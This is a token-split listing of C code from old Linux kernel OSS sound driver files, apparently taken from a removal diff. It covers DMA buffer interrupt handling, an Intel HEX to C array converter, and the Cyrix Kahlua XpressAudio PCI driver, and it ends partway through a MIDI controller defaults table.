";", "unsigned", "long", "f", ";", "f", "=", "claim_dma_lock", "(", ");", "if", "(", "!", "isa_dma_bridge_buggy", ")", "disable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "clear_dma_ff", "(", "chan", ")", ";", "pos", "=", "dmap", "-", ">", "bytes_in_use", "-", "get_dma_residue", "(", "chan", ")", ";", "if", "(", "!", "isa_dma_bridge_buggy", ")", "enable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "release_dma_lock", "(", "f", ")", ";", "pos", "=", "pos", "/", "dmap", "-", ">", "fragment_size", ";", "/", "*", "Actual", "qhead", "*", "/", "if", "(", "pos", "<", "0", "|", "|", "pos", ">", "=", "dmap", "-", ">", "nbufs", ")", "pos", "=", "0", ";", "n", "=", "0", ";", "while", "(", "dmap", "-", ">", "qhead", "!", "=", "pos", "&", "&", "n", "+", "+", "<", "dmap", "-", ">", "nbufs", ")", "do_outputintr", "(", "dev", ",", "notify_only", ")", ";", "}", "else", "do_outputintr", "(", "dev", ",", "notify_only", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "EXPORT_SYMBOL", "(", "DMAbuf_outputintr", ")", ";", "/", "*", "called", "with", "dmap", "-", ">", "lock", "held", "in", "irq", "context", "*", "/", "static", "void", "do_inputintr", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Fatal", "error", ".", "Audio", "interrupt", "after", "freeing", "buffers", ".", "\\", "n", "\"", ");", "return", ";", "}", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "dmap", "-", ">", "qtail", "=", "(", "dmap", "-", ">", "qtail", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "if", "(", "dmap", "-", ">", "qtail", "=", "=", "0", ")", "{", "/", "*", "Wrapped", "*", "/", "dmap", "-", ">", "byte_counter", "+", "=", "dmap", "-", ">", "bytes_in_use", ";", "if", "(", "dmap", "-", ">", "byte_counter", ">", "=", "dmap", "-", ">", "max_byte_counter", ")", "{", "/", "*", "Overflow", "*", "/", "long", "decr", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "byte_counter", "=", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", "+", "dmap", "-", ">", "bytes_in_use", ";", "decr", "-", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "user_counter", "-", "=", "decr", ";", "}", "}", "dmap", "-", ">", "qlen", "+", "+;", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_AUTOMODE", ")", ")", "{", "if", "(", "dmap", "-", ">", "needs_reorg", ")", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "0", ")", ";", "local_start_dma", "(", "adev", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "bytes_in_use", ",", "DMA_MODE_READ", ")", ";", "adev", "-", ">", "d", "-", ">", "start_input", "(", "dev", ",", "dmap", "-", ">", "raw_buf_phys", "+", "dmap", "-", ">", "qtail", "*", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "fragment_size", ",", "1", ")", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "trigger", ")", "adev", "-", ">", "d", "-", ">", "trigger", "(", "dev", ",", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", ";", "}", "dmap", "-", ">", "flags", "|", "=", "DMA_ACTIVE", ";", "}", "else", "if", "(", "dmap", "-", ">", "qlen", ">", "=", "(", "dmap", "-", ">", "nbufs", "-", "1", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "Recording", "overrun", "\\", "n", "\"", ");", "dmap", "-", ">", "underrun_count", "+", "+;", "/", "*", "Just", "throw", "away", "the", "oldest", "fragment", "but", "keep", "the", "engine", "running", "*", "/", "dmap", "-", ">", "qhead", "=", "(", "dmap", "-", ">", "qhead", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "dmap", "-", ">", "qtail", "=", "(", "dmap", "-", ">", "qtail", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "}", "else", "if", "(", "dmap", "-", ">", "qlen", ">", "=", "0", "&", "&", "dmap", "-", ">", "qlen", "<", "dmap", "-", ">", "nbufs", ")", "{", "dmap", "-", ">", "qlen", "+", "+;", "dmap", "-", ">", "qtail", "=", "(", "dmap", "-", ">", "qtail", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "if", "(", "dmap", "-", ">", "qtail", "=", "=", "0", ")", "{", "/", "*", "Wrapped", "*", "/", "dmap", "-", ">", "byte_counter", "+", "=", "dmap", "-", ">", "bytes_in_use", ";", "if", "(", "dmap", "-", ">", "byte_counter", ">", "=", "dmap", "-", ">", "max_byte_counter", ")", "{", "/", "*", "Overflow", "*", "/", "long", "decr", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "byte_counter", "=", "(", "dmap", "-", ">", "byte_counter", "%", "dmap", "-", ">", "bytes_in_use", ")", "+", "dmap", "-", ">", "bytes_in_use", ";", "decr", "-", "=", "dmap", "-", ">", "byte_counter", ";", "dmap", "-", ">", "user_counter", "-", "=", "decr", ";", "}", "}", "}", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_AUTOMODE", ")", "|", "|", "(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", ")", "{", "local_start_dma", "(", "adev", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "bytes_in_use", ",", "DMA_MODE_READ", ")", ";", "adev", "-", ">", "d", "-", ">", "start_input", "(", "dev", ",", "dmap", "-", ">", "raw_buf_phys", "+", "dmap", "-", ">", "qtail", "*", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "fragment_size", ",", "1", ")", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "trigger", ")", "adev", "-", ">", "d", "-", ">", "trigger", "(", "dev", ",", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", ";", "}", "dmap", "-", ">", "flags", "|", "=", "DMA_ACTIVE", ";", "if", "(", "dmap", "-", ">", "qlen", ">", "0", ")", "{", "wake_up", "(", "&", "adev", "-", ">", "in_sleeper", ")", ";", "wake_up", "(", "&", "adev", "-", ">", "poll_sleeper", ")", ";", "}", "}", "/", "*", "called", "in", "irq", "context", "*", "/", "void", "DMAbuf_inputintr", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", ")", "{", "int", "chan", "=", "dmap", "-", ">", "dma", ",", "pos", ",", "n", ";", "unsigned", "long", "f", ";", "f", "=", "claim_dma_lock", "(", ");", "if", "(", "!", "isa_dma_bridge_buggy", ")", "disable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "clear_dma_ff", "(", "chan", ")", ";", "pos", "=", "dmap", "-", ">", "bytes_in_use", "-", "get_dma_residue", "(", "chan", ")", ";", "if", "(", "!", "isa_dma_bridge_buggy", ")", "enable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "release_dma_lock", "(", "f", ")", ";", "pos", "=", "pos", "/", "dmap", "-", ">", "fragment_size", ";", "/", "*", "Actual", "qhead", "*", "/", "if", "(", "pos", "<", "0", "|", "|", "pos", ">", "=", "dmap", "-", ">", "nbufs", ")", "pos", "=", "0", ";", "n", "=", "0", ";", "while", "(", "dmap", "-", ">", "qtail", "!", "=", "pos", "&", "&", "+", "+", "n", "<", "dmap", "-", ">", "nbufs", ")", "do_inputintr", "(", "dev", ")", ";", "}", "else", "do_inputintr", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "EXPORT_SYMBOL", "(", "DMAbuf_inputintr", ")", ";", "void", "DMAbuf_init", "(", "int", "dev", ",", "int", "dma1", ",", "int", "dma2", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "/", "*", "*", "NOTE", "!", "This", "routine", "could", "be", "called", "several", "times", ".", "*", "/", "if", "(", "adev", "&", "&", "adev", "-", ">", "dmap_out", "=", "=", "NULL", ")", "{", "if", "(", "adev", "-", ">", "d", "=", "=", "NULL", ")", "panic", "(", "\"", "OSS", ":", "audio_devs", "[", "%", "d", "]", "->", "d", "=", "=", "NULL", "\\", "n", "\"", ",", "dev", ")", ";", "if", "(", "adev", "-", ">", "parent_dev", ")", "{", "/", "*", "Use", "DMA", "map", "of", "the", "parent", "dev", "*", "/", "int", "parent", "=", "adev", "-", ">", "parent_dev", "-", "1", ";", "adev", "-", ">", "dmap_out", "=", "audio_devs", "[", "parent", "]", "->", "dmap_out", ";", "adev", "-", ">", "dmap_in", "=", "audio_devs", "[", "parent", "]", "->", "dmap_in", ";", "}", "else", "{", "adev", "-", ">", "dmap_out", "=", "adev", "-", ">", "dmap_in", "=", "&", "adev", "-", ">", "dmaps", "[", "0", "]", ";", "adev", "-", ">", "dmap_out", "-", ">", "dma", "=", "dma1", ";", "if", "(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "{", "adev", "-", ">", "dmap_in", "=", "&", "adev", "-", ">", "dmaps", "[", "1", "]", ";", "adev", "-", ">", "dmap_in", "-", ">", "dma", "=", "dma2", ";", "}", "}", "/", "*", "Persistent", "DMA", "buffers", "allocated", "here", "*", "/", "if", "(", "sound_dmap_flag", "=", "=", "DMAP_KEEP_ON_CLOSE", ")", "{", "if", "(", "adev", "-", ">", "dmap_in", "-", ">", "raw_buf", "=", "=", "NULL", ")", "sound_alloc_dmap", "(", "adev", "-", ">", "dmap_in", ")", ";", "if", "(", "adev", "-", ">", "dmap_out", "-", ">", "raw_buf", "=", "=", "NULL", ")", "sound_alloc_dmap", "(", "adev", "-", ">", "dmap_out", ")", ";", "}", "}", "}", "/", "*", "No", "kernel", "lock", "-", "DMAbuf_activate_recording", "protected", "by", "global", "cli", "/", "sti", "*", "/", "static", "unsigned", "int", "poll_input", "(", "struct", "file", "*", "file", ",", "int", "dev", ",", "poll_table", "*", "wait", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "if", "(", "!(", "adev", "-", ">", "open_mode", "&", "OPEN_READ", ")", ")", "return", "0", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "if", "(", "dmap", "-", ">", "qlen", ")", "return", "POLLIN", "|", "POLLRDNORM", ";", "return", "0", ";", "}", "if", "(", "dmap", "-", ">", "dma_mode", "!", "=", "DMODE_INPUT", ")", "{", "if", "(", "dmap", "-", ">", "dma_mode", "=", "=", "DMODE_NONE", "&", "&", "adev", "-", ">", "enable_bits", "&", "PCM_ENABLE_INPUT", "&", "&", "!", "dmap", "-", ">", "qlen", "&", "&", "adev", "-", ">", "go", ")", "{", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "DMAbuf_activate_recording", "(", "dev", ",", "dmap", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "return", "0", ";", "}", "if", "(", "!", "dmap", "-", ">", "qlen", ")", "return", "0", ";", "return", "POLLIN", "|", "POLLRDNORM", ";", "}", "static", "unsigned", "int", "poll_output", "(", "struct", "file", "*", "file", ",", "int", "dev", ",", "poll_table", "*", "wait", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "if", "(", "!(", "adev", "-", ">", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "0", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "{", "if", "(", "dmap", "-", ">", "qlen", ")", "return", "POLLOUT", "|", "POLLWRNORM", ";", "return", "0", ";", "}", "if", "(", "dmap", "-", ">", "dma_mode", "=", "=", "DMODE_INPUT", ")", "return", "0", ";", "if", "(", "dmap", "-", ">", "dma_mode", "=", "=", "DMODE_NONE", ")", "return", "POLLOUT", "|", "POLLWRNORM", ";", "if", "(", "!", "DMAbuf_space_in_queue", "(", "dev", ")", ")", "return", "0", ";", "return", "POLLOUT", "|", "POLLWRNORM", ";", "}", "unsigned", "int", "DMAbuf_poll", "(", "struct", "file", "*", "file", ",", "int", "dev", ",", "poll_table", "*", "wait", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "poll_wait", "(", "file", ",", "&", "adev", "-", ">", "poll_sleeper", ",", "wait", ")", ";", "return", "poll_input", "(", "file", ",", "dev", ",", "wait", ")", "|", "poll_output", "(", "file", ",", "dev", ",", "wait", ")", ";", "}", "void", "DMAbuf_deinit", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "/", "*", "This", "routine", "is", "called", "when", "driver", "is", "being", "unloaded", "*", "/", "if", "(", "!", "adev", ")", "return", ";", "/", "*", "Persistent", "DMA", "buffers", "deallocated", "here", "*", "/", "if", "(", "sound_dmap_flag", "=", "=", "DMAP_KEEP_ON_CLOSE", ")", "{", "sound_free_dmap", "(", "adev", "-", ">", "dmap_out", ")", ";", "if", "(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "sound_free_dmap", "(", "adev", "-", ">", "dmap_in", ")", ";", "}", "}", "@", "@", "-", "1", ",", "101", "+", "0", ",", "0", "@", "@", "/", "*", "*", "hex2hex", "reads", "stdin", "in", "Intel", "HEX", "format", "and", "produces", "an", "*", "(", "unsigned", "char", ")", "array", "which", "contains", "the", "bytes", "and", "writes", "it", "*", "to", "stdout", "using", "C", "syntax", "*", "/", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "string", ".", "h", ">", "#", "include", "<", "stdlib", ".", "h", ">", "#", "define", "ABANDON", "(", "why", ")", "{", "fprintf", "(", "stderr", ",", "\"", "%", "s", "\\", "n", "\"", ",", "why", ")", ";", "exit", "(", "1", ")", ";", "}", "#", "define", "MAX_SIZE", "(", "256", "*", "1024", ")", "unsigned", "char", "buf", "[", "MAX_SIZE", "]", ";", "static", "int", "loadhex", "(", "FILE", "*", "inf", ",", "unsigned", "char", "*", "buf", ")", "{", "int", "l", "=", "0", ",", "c", ",", "i", ";", "while", "(", "(", "c", "=", "getc", "(", "inf", ")", ")!", "=", "EOF", ")", "{", "if", "(", "c", "=", "=", "'", ":'", ")", "/", "*", "Sync", "with", "beginning", "of", "line", "*", "/", "{", "int", "n", ",", "check", ";", "unsigned", "char", "sum", ";", "int", "addr", ";", "int", "linetype", ";", "if", "(", "fscanf", "(", "inf", ",", "\"", "%", "02x", "\"", ",", "&", "n", ")", "!", "=", "1", ")", "ABANDON", "(", "\"", "File", "format", "error", "\"", ");", "sum", "=", "n", ";", "if", "(", "fscanf", "(", "inf", ",", "\"", "%", "04x", "\"", ",", "&", "addr", ")", "!", "=", "1", ")", "ABANDON", "(", "\"", "File", "format", "error", "\"", ");", "sum", "+", "=", "addr", "/", "256", ";", "sum", "+", "=", "addr", "%", "256", ";", "if", "(", "fscanf", "(", "inf", ",", "\"", "%", "02x", "\"", ",", "&", "linetype", ")", "!", "=", "1", ")", "ABANDON", "(", "\"", "File", "format", "error", "\"", ");", "sum", "+", "=", "linetype", ";", "if", "(", "linetype", "!", "=", "0", ")", "continue", ";", "for", "(", "i", "=", "0", ";", "i", "<", "n", ";", "i", "+", "+)", "{", "if", "(", "fscanf", "(", "inf", ",", "\"", "%", "02x", "\"", ",", "&", "c", ")", "!", "=", "1", ")", "ABANDON", "(", "\"", "File", "format", "error", "\"", ");", "if", "(", "addr", ">", "=", "MAX_SIZE", ")", "ABANDON", "(", "\"", "File", "too", "large", "\"", ");", "buf", "[", "addr", "+", "+]", "=", "c", ";", "if", "(", "addr", ">", "l", ")", "l", "=", "addr", ";", "sum", "+", "=", "c", ";", "}", "if", "(", "fscanf", "(", "inf", ",", "\"", "%", "02x", "\"", ",", "&", "check", ")", "!", "=", "1", ")", "ABANDON", "(", "\"", "File", "format", "error", "\"", ");", "sum", "=", "~", "sum", "+", "1", ";", "if", "(", "check", "!", "=", "sum", ")", "ABANDON", "(", "\"", "Line", "checksum", "error", "\"", ");", "}", "}", "return", "l", ";", "}", "int", "main", "(", "int", "argc", ",", "const", "char", "*", "argv", "[", "]", ")", "{", "const", "char", "*", "varline", ";", "int", "i", ",", "l", ";", "int", "id", "=", "0", ";", "if", "(", "argv", "[", "1", "]", "&", "&", "strcmp", "(", "argv", "[", "1", "]", ",", "\"", "-", "i", "\"", ")=", "=", "0", ")", "{", "argv", "+", "+;", "argc", "-", "-;", "id", "=", "1", ";", "}", "if", "(", "argv", "[", "1", "]", "==", "NULL", ")", "{", "fprintf", "(", "stderr", ",", "\"", "hex2hex", ":", "[", "-", "i", "]", "filename", "\\", "n", "\"", ");", "exit", "(", "1", ")", ";", "}", "varline", "=", "argv", "[", "1", "]", ";", "l", "=", "loadhex", "(", "stdin", ",", "buf", ")", ";", "printf", "(", "\"/", "*\\", "n", "*", "\\", "t", "Computer", "generated", "file", ".", "Do", "not", "edit", ".", "\\", "n", "*", "/\\", "n", "\"", ");", "printf", "(", "\"", "static", "int", "%", "s_len", "=", "%", "d", ";", "\\", "n", "\"", ",", "varline", ",", "l", ")", ";", "printf", "(", "\"", "static", "unsigned", "char", "%", "s", "[", "]", "%", "s", "=", "{", "\\", "n", "\"", ",", "varline", ",", "id", "?", "\"", "__initdata", "\"", ":\"", "\")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "l", ";", "i", "+", "+)", "{", "if", "(", "i", ")", "printf", "(", "\",", "\")", ";", "if", "(", "i", "&", "&", "!", "(", "i", "%", "16", ")", ")", "printf", "(", "\"\\", "n", "\"", ");", "printf", "(", "\"", "0x", "%", "02x", "\"", ",", "buf", "[", "i", "]", ");", "}", "printf", "(", "\"\\", "n", "}", ";\\", "n", "\\", "n", "\"", ");", "return", "0", ";", "}", "@", "@", "-", "1", ",", "229", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Initialisation", "code", "for", "Cyrix", "/", "NatSemi", "VSA1", "softaudio", "*", "*", "(", "C", ")", "Copyright", "2003", "Red", "Hat", "Inc", "<", "alan", "@", "lxorguk", ".", "ukuu", ".", "org", ".", "uk", ">", "*", "*", "XpressAudio", "(", "tm", ")", "is", "used", "on", "the", "Cyrix", "MediaGX", "(", "now", "NatSemi", "Geode", ")", "systems", ".", "*", "The", "older", "version", "(", "VSA1", ")", "provides", "fairly", "good", "soundblaster", "emulation", "*", "although", "there", "are", "a", "couple", "of", "bugs", ":", "large", "DMA", "buffers", "break", "record", ",", "*", "and", "the", "MPU", "event", "handling", "seems", "suspect", ".", "VSA2", "allows", "the", "native", "driver", "*", "to", "control", "the", "AC97", "audio", "engine", "directly", "and", "requires", "a", "different", "driver", ".", "*", "*", "Thanks", "to", "National", "Semiconductor", "for", "providing", "the", "needed", "information", "*", "on", "the", "XpressAudio", "(", "tm", ")", "internals", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "*", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "the", "*", "Free", "Software", "Foundation", ";", "either", "version", "2", ",", "or", "(", "at", "your", "option", ")", "any", "*", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "*", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "*", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "TO", "DO", ":", "*", "Investigate", "whether", "we", "can", "portably", "support", "Cognac", "(", "5520", ")", "in", "the", "*", "same", "manner", ".", "*", "/", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "pci", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "sb", ".", "h", "\"", "/", "*", "*", "Read", "a", "soundblaster", "compatible", "mixer", "register", ".", "*", "In", "this", "case", "we", "are", "actually", "reading", "an", "SMI", "trap", "*", "not", "real", "hardware", ".", "*", "/", "static", "u8", "mixer_read", "(", "unsigned", "long", "io", ",", "u8", "reg", ")", "{", "outb", "(", "reg", ",", "io", "+", "4", ")", ";", "udelay", "(", "20", ")", ";", "reg", "=", "inb", "(", "io", "+", "5", ")", ";", "udelay", "(", "20", ")", ";", "return", "reg", ";", "}", "static", "int", "probe_one", "(", "struct", "pci_dev", "*", "pdev", ",", "const", "struct", "pci_device_id", "*", "ent", ")", "{", "struct", "address_info", "*", "hw_config", ";", "unsigned", "long", "base", ";", "void", "__iomem", "*", "mem", ";", "unsigned", "long", "io", ";", "u16", "map", ";", "u8", "irq", ",", "dma8", ",", "dma16", ";", "int", "oldquiet", ";", "extern", "int", "sb_be_quiet", ";", "base", "=", "pci_resource_start", "(", "pdev", ",", "0", ")", ";", "if", "(", "base", "=", "=", "0UL", ")", "return", "1", ";", "mem", "=", "ioremap", "(", "base", ",", "128", ")", ";", "if", "(", "!", "mem", ")", "return", "1", ";", "map", "=", "readw", "(", "mem", "+", "0x18", ")", ";", "/", "*", "Read", "the", "SMI", "enables", "*", "/", "iounmap", "(", "mem", ")", ";", "/", "*", "Map", "bits", "0", ":", "1", "*", "0x20", "+", "0x200", "=", "sb", "base", "2", "sb", "enable", "3", "adlib", "enable", "5", "MPU", "enable", "0x330", "6", "MPU", "enable", "0x300", "The", "other", "bits", "may", "be", "used", "internally", "so", "must", "be", "masked", "*", "/", "io", "=", "0x220", "+", "0x20", "*", "(", "map", "&", "3", ")", ";", "if", "(", "map", "&", "(", "1", "<", "<", "2", ")", ")", "printk", "(", "KERN_INFO", "\"", "kahlua", ":", "XpressAudio", "at", "0x", "%", "lx", "\\", "n", "\"", ",", "io", ")", ";", "else", "return", "1", ";", "if", "(", "map", "&", "(", "1", "<", "<", "5", ")", ")", "printk", "(", "KERN_INFO", "\"", "kahlua", ":", "MPU", "at", "0x300", "\\", "n", "\"", ");", "else", "if", "(", "map", "&", "(", "1", "<", "<", "6", ")", ")", "printk", "(", "KERN_INFO", "\"", "kahlua", ":", "MPU", "at", "0x330", "\\", "n", "\"", ");", "irq", "=", "mixer_read", "(", "io", ",", "0x80", ")", "&", "0x0F", ";", "dma8", "=", "mixer_read", "(", "io", ",", "0x81", ")", ";", "/", "/", "printk", "(", "\"", "IRQ", "=", "%", "x", "MAP", "=", "%", "x", "DMA", "=", "%", "x", "\\", "n", "\"", ",", "irq", ",", "map", ",", "dma8", ")", ";", "if", "(", "dma8", "&", "0x20", ")", "dma16", "=", "5", ";", "else", "if", "(", "dma8", "&", "0x40", ")", "dma16", "=", "6", ";", "else", "if", "(", "dma8", "&", "0x80", ")", "dma16", "=", "7", ";", "else", "{", "printk", "(", "KERN_ERR", "\"", "kahlua", ":", "No", "16bit", "DMA", "enabled", ".", "\\", "n", "\"", ");", "return", "1", ";", "}", "if", "(", "dma8", "&", "0x01", ")", "dma8", "=", "0", ";", "else", "if", "(", "dma8", "&", "0x02", ")", "dma8", "=", "1", ";", "else", "if", "(", "dma8", "&", "0x08", ")", "dma8", "=", "3", ";", "else", "{", "printk", "(", "KERN_ERR", "\"", "kahlua", ":", "No", "8bit", "DMA", "enabled", ".", "\\", "n", "\"", ");", "return", "1", ";", "}", "if", "(", "irq", "&", "1", ")", "irq", "=", "9", ";", "else", "if", "(", "irq", "&", "2", ")", "irq", "=", "5", ";", "else", "if", "(", "irq", "&", "4", ")", "irq", "=", "7", ";", "else", "if", "(", "irq", "&", "8", ")", "irq", "=", "10", ";", "else", "{", "printk", "(", "KERN_ERR", "\"", "kahlua", ":", "SB", "IRQ", "not", "set", ".", "\\", "n", "\"", ");", "return", "1", ";", "}", "printk", "(", "KERN_INFO", "\"", "kahlua", ":", "XpressAudio", "on", "IRQ", "%", "d", ",", "DMA", "%", "d", ",", "%", "d", "\\", "n", "\"", ",", "irq", ",", "dma8", ",", "dma16", ")", ";", "hw_config", "=", "kzalloc", "(", "sizeof", "(", "struct", "address_info", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "hw_config", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "kahlua", ":", "out", "of", "memory", ".", "\\", "n", "\"", ");", "return", "1", ";", "}", "pci_set_drvdata", "(", "pdev", ",", "hw_config", ")", ";", "hw_config", "-", ">", "io_base", "=", "io", ";", "hw_config", "-", ">", "irq", "=", "irq", ";", "hw_config", "-", ">", "dma", "=", "dma8", ";", "hw_config", "-", ">", "dma2", "=", "dma16", ";", "hw_config", "-", ">", "name", "=", "\"", "Cyrix", "XpressAudio", "\"", ";", "hw_config", "-", ">", "driver_use_1", "=", "SB_NO_MIDI", "|", "SB_PCI_IRQ", ";", "if", "(", "!", "request_region", "(", "io", ",", "16", ",", "\"", "soundblaster", "\"", "))", "goto", "err_out_free", ";", "if", "(", "sb_dsp_detect", "(", "hw_config", ",", "0", ",", "0", ",", "NULL", ")", "==", "0", ")", "{", "printk", "(", "KERN_ERR", "\"", "kahlua", ":", "audio", "not", "responding", ".", "\\", "n", "\"", ");", "release_region", "(", "io", ",", "16", ")", ";", "goto", "err_out_free", ";", "}", "oldquiet", "=", "sb_be_quiet", ";", "sb_be_quiet", "=", "1", ";", "if", "(", "sb_dsp_init", "(", "hw_config", ",", "THIS_MODULE", ")", ")", "{", "sb_be_quiet", "=", "oldquiet", ";", "goto", "err_out_free", ";", "}", "sb_be_quiet", "=", "oldquiet", ";", "return", "0", ";", "err_out_free", ":", "kfree", "(", "hw_config", ")", ";", "return", "1", ";", "}", "static", "void", "remove_one", "(", "struct", "pci_dev", "*", "pdev", ")", "{", "struct", "address_info", "*", "hw_config", "=", "pci_get_drvdata", "(", "pdev", ")", ";", "sb_dsp_unload", "(", "hw_config", ",", "0", ")", ";", "kfree", "(", "hw_config", ")", ";", "}", "MODULE_AUTHOR", "(", "\"", "Alan", "Cox", "\"", ");", "MODULE_DESCRIPTION", "(", "\"", "Kahlua", "VSA1", "PCI", "Audio", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "/", "*", "*", "5530", "only", ".", "The", "5510", "/", "5520", "decode", "is", "different", ".", "*", "/", "static", "const", "struct", "pci_device_id", "id_tbl", "[", "]", "=", "{", "{", "PCI_VDEVICE", "(", "CYRIX", ",", "PCI_DEVICE_ID_CYRIX_5530_AUDIO", ")", ",", "0", "}", ",", "{", "}", "}", ";", "MODULE_DEVICE_TABLE", "(", "pci", ",", "id_tbl", ")", ";", "static", "struct", "pci_driver", "kahlua_driver", "=", "{", ".", "name", "=", "\"", "kahlua", "\"", ",", ".", "id_table", "=", "id_tbl", ",", ".", "probe", "=", "probe_one", ",", ".", "remove", "=", "remove_one", ",", "}", ";", "static", "int", "__init", "kahlua_init_module", "(", "void", ")", "{", "printk", "(", "KERN_INFO", "\"", "Cyrix", "Kahlua", "VSA1", "XpressAudio", "support", "(", "c", ")", "Copyright", "2003", "Red", "Hat", "Inc", "\\", "n", "\"", ");", "return", "pci_register_driver", "(", "&", "kahlua_driver", ")", ";", "}", "static", "void", "kahlua_cleanup_module", "(", "void", ")", "{", "pci_unregister_driver", "(", "&", "kahlua_driver", ")", ";", "}", "module_init", "(", "kahlua_init_module", ")", ";", "module_exit", "(", "kahlua_cleanup_module", ")", ";", "@", "@", "-", "1", ",", "22", "+", "0", ",", "0", "@", "@", "static", "unsigned", "char", "ctrl_def_values", "[", "128", "]", "=", "{", "0x40", ",", "0x00", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x7f", ",", "/", "*", "0", "to", "7", "*", "/", "0x40", ",", "0x40", ",", "0x40", ",", "0x7f", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "/", "*", "8", "to", "15", "*", "/", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "/", "*", "16", "to", "23", "*", "/", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "0x40", ",", "/", "*", "24", "to", "31", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "32", "to", "39", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "40", "to", "47", "*", "/", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "0x00", ",", "/", "*", "48", "to", "55", 